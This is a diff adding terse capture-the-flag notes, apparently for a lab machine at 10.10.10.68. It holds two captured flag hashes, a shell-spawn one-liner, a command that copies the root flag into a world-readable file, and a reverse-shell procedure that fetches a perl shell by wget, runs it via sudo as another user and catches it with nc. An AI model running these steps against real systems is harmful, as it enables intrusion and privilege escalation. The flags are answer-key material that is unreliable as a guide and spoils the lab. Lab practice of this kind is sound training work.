@@ -1,0 +1,45 @@
+#flag from output
+cc4f0afe3a1026d402ba10329674a8e2
+
+
+#user arrexel
+2c281f318555dbc1b856957c7147bfc1
+
+import pty; pty.spawn(/bin/bash)
+
+import os; os.system('cp /root/root.txt /tmp/output && chmod 777 /tmp/output')
+
+
+#
+ip 10.10.10.68
+
+Apache/2.4.18 (Ubuntu) Server at 10.10.10.68 Port 80
+
+LinEnum.sh
+linuxprivchecker
+v
+
+#hints
+Check basic linux privilegie escalation
+
+check for the commands which the current user can invoke as the other user on the system
+
+have you run an enumeration script to find anomalies? If you ran LinEnum, what did it tell you that stood out?
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+transfer shell
+#get shell
+/usr/share/webshells/perl/perl-reverse-shell.pl
+#change IP and PORT
+#copy shell to /var/www/html
+#service apache2 start
+#frow victim mashine wget http://<ip>/shell.pl
+
+#from victim mashine 
+sudo -u scriptmanaget perl shell.pl
+
+#from hostmashine 
+nc -nlvp PORT
+
+
